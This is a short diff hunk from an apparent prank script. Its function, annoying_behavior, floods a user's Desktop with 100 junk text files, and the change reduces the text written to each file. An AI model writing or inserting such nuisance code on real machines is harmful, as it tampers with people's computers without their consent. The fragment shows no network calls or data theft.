@@ -52,7 +52,7 @@ def annoying_behavior():
           for _ in range(100):
                count += 1
                with open(f'/home/{usr}/Desktop/SUSSY{count}.txt', 'w+') as f:
-                    f.write("SO SUSSY"*100)
+                    f.write("SO SUSSY")
                
                
           for _ in range(35):
